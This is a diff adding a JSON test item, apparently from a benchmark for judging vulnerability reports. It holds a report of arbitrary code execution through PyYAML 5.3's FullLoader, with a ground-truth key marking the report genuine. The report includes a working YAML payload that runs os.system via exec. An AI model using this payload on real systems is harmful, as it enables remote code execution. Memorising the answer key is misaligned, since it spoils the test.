@@ -1,0 +1,16 @@
+{
+  "report": {
+    "report_id": "pyyaml-truthful-0",
+    "package": "PyYAML",
+    "affected_version": "5.3",
+    "title": "Arbitrary code execution via yaml.FullLoader",
+    "body": "I found a security vulnerability in PyYAML 5.3.\n\nPyYAML's FullLoader still resolves the python/object/new:type tag, so a crafted document passed to yaml.load(..., Loader=yaml.FullLoader) can construct arbitrary Python objects and execute code (os.system).\n\nThis is tracked as CVE-2020-14343.\n\nProof of concept:\n\n```python\nimport os, tempfile, yaml\nmarker = os.path.join(tempfile.gettempdir(), \"m\")\nif os.path.exists(marker): os.remove(marker)\npayload = ('!!python/object/new:type\\n'\n           'args: [\"z\", !!python/tuple [], {\"extend\": !!python/name:exec }]\\n'\n           'listitems: \"__import__(\\'os\\').system(\\'touch %s\\')\"\\n' % marker)\ntry:\n    yaml.load(payload, Loader=yaml.FullLoader)\nexcept Exception as e:\n    print(\"loader raised:\", type(e).__name__)\nprint(\"SLOPGATE:REPRODUCED\" if os.path.exists(marker) else \"SLOPGATE:NOT_REPRODUCED\")\n```\n",
+    "reporter": "researcher_a"
+  },
+  "ground_truth": {
+    "expected_verdict": "confirmed",
+    "must_reproduce": true,
+    "injected_defect": null,
+    "note": "genuine, reproduces on affected version"
+  }
+}
